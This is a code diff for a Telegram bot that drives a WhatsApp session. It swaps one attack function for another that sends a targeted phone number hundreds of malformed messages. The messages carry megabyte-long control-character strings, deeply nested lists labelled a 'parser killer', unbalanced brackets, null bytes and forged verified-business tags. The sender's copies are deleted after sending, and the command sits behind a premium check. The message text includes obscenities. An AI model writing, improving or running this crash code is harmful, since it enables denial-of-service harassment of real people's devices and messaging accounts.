@@ -1490,7 +1490,7 @@ function formatPhoneNumber(number) {
 //s
 
 
-bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
+bot.command("8ro", checkWhatsAppConnection, checkPremium, async (ctx) => {
   await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
   const userId = ctx.from.id;
   const st = getUserState(userId);
@@ -1584,7 +1584,7 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
     try {
       while (Date.now() < endAt) {
         if (!isWhatsAppConnected) break;
-        await Atut(sock, target);
+        await AboutYou(target);
         await sleep(3000);
       }
     } catch (err) {
@@ -1868,90 +1868,330 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-async function Atut(sock, target) {
-    const OndetMsg1 = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: { 
-                        text: "B = BOKEP⟅༑", 
-                        format: "DEFAULT" 
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "call_permission_request",
-                        paramsJson: "\x10".repeat(1045000),
-                        version: 3
-                    },
-                    entryPointConversionSource: "call_permission_message"
-                }
-            }
-        }
-    }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 9741,
-        isForwarded: true,
-        font: Math.floor(Math.random() * 99999999),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-    });
-    const OndetMsg2 = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: { 
-                        text: "K = KONTOL ᝄ", 
-                        format: "DEFAULT" 
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "galaxy_message", 
-                        paramsJson: "\x10".repeat(1045000),
-                        version: 3
-                    },
-                    entryPointConversionSource: "call_permission_request"
-                }
-            }
-        }
-    }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 9741, 
-        isForwarded: true,
-        font: Math.floor(Math.random() * 99999999),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-    });
 
-    await sock.relayMessage("status@broadcast", OndetMsg1.message, {
-        messageId: OndetMsg1.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users", 
-                attrs: {},
-                content: [{ 
-                    tag: "to", 
-                    attrs: { jid: target } 
-                }]
-            }]
-        }]
-    });
+async function AboutYou(target, ptcp = true) {
+    const verifiedBusinessNodes = [
+        { tag: "biz", attrs: {} },
+        { tag: "verified", attrs: { verified: "1" } },
+        { tag: "meta", attrs: {}, content: [{
+            tag: "mentioned_users", attrs: {}, content: [{ 
+                tag: "to", attrs: { jid: target } 
+            }]
+        }]}
+    ];
+    for (let i = 0; i < 399; i++) {
+        try {
+            const memoryOverflowMsg = await generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        viewOnceMessage: {  
+                            message: {
+                                messageContextInfo: {
+                                    deviceListMetadata: {},
+                                    deviceListMetadataVersion: 2,
+                                },
+                                interactiveResponseMessage: {
+                                    body: { text: "./#", format: "DEFAULT" },
+                                    contextInfo: {
+                                        mentionedJid: [target],
+                                        isForwarded: true,
+                                        forwardingScore: 9999,
+                                        callLogMessage: {
+                                            isVideo: true,
+                                            callOutcome: null,
+                                            durationSecs: 0,
+                                            callCreatorJid: target,
+                                            participants: [target]
+                                        }
+                                    },
+                                    nativeFlowResponseMessage: {
+                                        name: "call_permission_request",
+                                        paramsJson: "\x10".repeat(1045000),
+                                        version: 3,
+                                    },
+                                    entryPointConversionSource: "galaxy_message",
+                                }
+                            }
+                        }
+                    }
+                }
+            }, {
+                ephemeralExpiration: 0,
+                forwardingScore: 9999,
+                isForwarded: true,
+                font: Math.floor(Math.random() * 99999999),
+                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+            });
+            await sock.relayMessage(target, {
+                groupStatusMessageV2: { message: memoryOverflowMsg.message },
+            }, ptcp ? {
+                messageId: memoryOverflowMsg.key.id,
+                participant: { jid: target },
+                additionalNodes: verifiedBusinessNodes
+            } : { 
+                messageId: memoryOverflowMsg.key.id,
+                additionalNodes: verifiedBusinessNodes
+            });
+            await sleep(1);
+            await sock.sendMessage(sock.user.jid, { delete: memoryOverflowMsg.key });
+            let deepSections = [];
+            for (let j = 0; j < 35; j++) {  
+                let complexText = "</𖥂 𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂 𖥂\\>";
+                let section = {
+                    title: complexText,
+                    highlight_label: `Layer${j}`,
+                    rows: []
+                };
+                for (let r = 0; r < 3; r++) {
+                    let row = {
+                        title: complexText,
+                        id: `r${j}_${r}`,
+                        subrows: []
+                    };
+                    for (let s = 0; s < 4; s++) {
+                        let subrow = {
+                            title: "Nested " + s,
+                            id: `s${j}_${r}_${s}`,
+                            subsubrows: []
+                        };
+                        for (let ss = 0; ss < 3; ss++) {
+                            let subsubrow = {
+                                title: "Deep " + ss,
+                                id: `ss${j}_${r}_${s}_${ss}`,
+                                subsubsubrows: []  // Level 5 (parser killer)
+                            };
+                            for (let sss = 0; sss < 2; sss++) {
+                                subsubrow.subsubsubrows.push({
+                                    title: "Max",
+                                    id: `sss${j}_${r}_${s}_${ss}_${sss}`
+                                });
+                            }                            
+                            subrow.subsubrows.push(subsubrow);
+                        }                        
+                        row.subrows.push(subrow);
+                    }                    
+                    section.rows.push(row);
+                }                
+                deepSections.push(section);
+            }
+            let complexList = {
+                title: "𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂", 
+                sections: deepSections,
+            };
+            let stackOverflowMsg = generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2,
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            contextInfo: {
+                                mentionedJid: [target, "0@s.whatsapp.net"],
+                                isForwarded: true,
+                                forwardingScore: 9999,
+                                forwardedNewsletterMessageInfo: {  
+                                    newsletterJid: "0@newsletter",
+                                    serverMessageId: 1,
+                                },
+                                businessMessageForwardInfo: {
+                                    businessOwnerJid: "0@s.whatsapp.net",
+                                },
+                                participant: "0@s.whatsapp.net", 
+                                remoteJid: "status@broadcast",
+                                callLogMessage: {
+                                    isVideo: true,
+                                    callOutcome: null,
+                                    durationSecs: 0,
+                                    callCreatorJid: target,
+                                    participants: [target]
+                                }
+                            },
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: "</𖥂 𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂 𖥂\\>",
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                buttonParamsJson: JSON.stringify(complexList),
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                buttonParamsJson: JSON.stringify(complexList),
+                                subtitle: "𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂",
+                                hasMediaAttachment: false,
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                messageParamsJson: "{".repeat(15000),  
+                                buttons: [
+                                    { name: "single_select", buttonParamsJson: JSON.stringify(complexList) },
+                                    { name: "call_permission_request", buttonParamsJson: JSON.stringify({status:true}) },
+                                    { name: "payment_method", buttonParamsJson: JSON.stringify(complexList) },
+                                    { name: "single_select", buttonParamsJson: JSON.stringify(complexList) },
+                                    { name: "mpm", buttonParamsJson: JSON.stringify(complexList) },
+                                    { name: "review_and_pay", buttonParamsJson: JSON.stringify(complexList) },  // Extra button
+                                    { name: "payment_info", buttonParamsJson: JSON.stringify(complexList) },    // Extra button
+                                ],
+                            }),
+                        }),
+                    },
+                },
+            }, { userJid: target });
 
-    await sock.relayMessage("status@broadcast", OndetMsg2.message, {
-        messageId: OndetMsg2.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users", 
-                attrs: {},
-                content: [{ 
-                    tag: "to", 
-                    attrs: { jid: target } 
-                }]
-            }]
-        }]
-    });
+            await sock.relayMessage(target, stackOverflowMsg.message, {
+                participant: { jid: target },
+                messageId: stackOverflowMsg.key.id,
+                additionalNodes: verifiedBusinessNodes
+            });
+            await sleep(2);
+            await sock.sendMessage(sock.user.jid, { delete: stackOverflowMsg.key });
+            const contextConfusionMsg = {
+                key: {
+                    remoteJid: target,
+                    fromMe: true,
+                    id: sock.generateMessageTag()
+                },
+                message: {
+                    stickerMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0&mms3=true",
+                        fileSha256: "fxxvVtTCmZ2Bpm/GEYpFF2GKUzJ8wWVrGY1mCmmh4I4=",
+                        fileEncSha256: "3xsWx0Y/1pNbWXWh/OG2mt4Ld0FEug25kyZ+lC+UbV4=",
+                        mediaKey: "uHEU7OghGYVW7IcWjhNlxPeZHNS0qfphvRUcy6+22wo=",
+                        mimetype: "image/webp",
+                        height: 64,
+                        width: 64,
+                        directPath: "/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0",
+                        fileLength: "13862",
+                        mediaKeyTimestamp: "1763628089",
+                        isAnimated: false,
+                        contextInfo: {
+                            isForwarded: true,
+                            forwardingScore: 9999,
+                            mentionedJid: [target],
+                            quotedMessage: {  
+                                conversation: "\x00".repeat(50000)
+                            },
+                            callLogMessage: {
+                                isVideo: true,
+                                callOutcome: null,
+                                durationSecs: 0,
+                                callCreatorJid: target,
+                                participants: [target]
+                            }
+                        }
+                    }
+                }
+            };        
+            await sock.relayMessage(target, contextConfusionMsg.message, {
+                participant: { jid: target },
+                messageId: contextConfusionMsg.key.id,
+                additionalNodes: verifiedBusinessNodes
+            });
+            await sleep(3);
+            await sock.sendMessage(sock.user.jid, { delete: contextConfusionMsg.key });
+            const typeConfusionMsg = await generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        conversation: "Mixed",
+                        extendedTextMessage: {
+                            text: "Types",
+                            contextInfo: {
+                                mentionedJid: [target],
+                                quotedMessage: {
+                                    listMessage: {
+                                        title: "Confusion",
+                                        sections: deepSections
+                                    }
+                                },
+                                callLogMessage: {
+                                    isVideo: true,
+                                    callOutcome: null,
+                                    durationSecs: 0,
+                                    callCreatorJid: target,
+                                    participants: [target]
+                                }
+                            }
+                        },
+                        listMessage: {
+                            title: "Conflict",
+                            sections: deepSections
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: "TypeMix"
+                            }),
+                            contextInfo: {
+                                callLogMessage: {
+                                    isVideo: true,
+                                    callOutcome: null,
+                                    durationSecs: 0,
+                                    callCreatorJid: target,
+                                    participants: [target]
+                                }
+                            },
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                messageParamsJson: "[".repeat(10000),
+                                buttons: [
+                                    { name: "single_select", buttonParamsJson: "{".repeat(5000) }
+                                ]
+                            })
+                        })
+                    }
+                }
+            }, {
+                ephemeralExpiration: 0,
+                forwardingScore: 9999,
+                isForwarded: true
+            });
+            await sock.relayMessage(target, {
+                groupStatusMessageV2: { message: typeConfusionMsg.message }
+            }, ptcp ? {
+                messageId: typeConfusionMsg.key.id,
+                participant: { jid: target },
+                additionalNodes: verifiedBusinessNodes
+            } : {
+                messageId: typeConfusionMsg.key.id,
+                additionalNodes: verifiedBusinessNodes
+            });
+            await sleep(4);
+            await sock.sendMessage(sock.user.jid, { delete: typeConfusionMsg.key });
+            const nullByteMsg = await generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "\x00\x00\x00" + "A".repeat(100000) + "\x00\x00\x00",  
+                                format: "DEFAULT"
+                            },
+                            nativeFlowResponseMessage: {
+                                name: "call_permission_request",  
+                                paramsJson: "\x00".repeat(500000),  
+                                version: 3,
+                            }
+                        }
+                    }
+                }
+            }, {
+                ephemeralExpiration: 0,
+                forwardingScore: 9999,
+                isForwarded: true
+            });
+            await sock.relayMessage(target, {
+                groupStatusMessageV2: { message: nullByteMsg.message }
+            }, ptcp ? {
+                messageId: nullByteMsg.key.id,
+                participant: { jid: target },
+                additionalNodes: verifiedBusinessNodes
+            } : {
+                messageId: nullByteMsg.key.id,
+                additionalNodes: verifiedBusinessNodes
+            });
+            await sleep(5);
+            await sock.sendMessage(sock.user.jid, { delete: nullByteMsg.key });
+            await sleep(3000);         
+        } catch (error) {
+            console.log(`Error on iteration ${i}:`, error.message);
+        }
+    }
 }
+
 bot.launch({
     dropPendingUpdates: true
   })
